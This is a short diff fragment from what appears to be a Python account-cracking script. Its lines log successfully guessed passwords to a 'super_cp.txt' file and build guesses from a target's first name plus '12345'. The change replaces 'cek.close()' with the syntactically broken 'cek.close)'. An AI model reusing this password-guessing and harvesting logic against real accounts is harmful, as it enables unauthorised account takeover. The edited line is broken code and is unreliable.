@@ -437,7 +437,7 @@ def pilih_super():
 				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass6 + '\n'
 				                                                               cek = open("out/super_cp.txt", "a")
 				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
-				                                                               cek.close()
+				                                                               cek.close)
 				                                                               cekpoint.append(user+pass6)	
 						                                           else:							
 								                               pass7 = b['first_name']+'12345'						
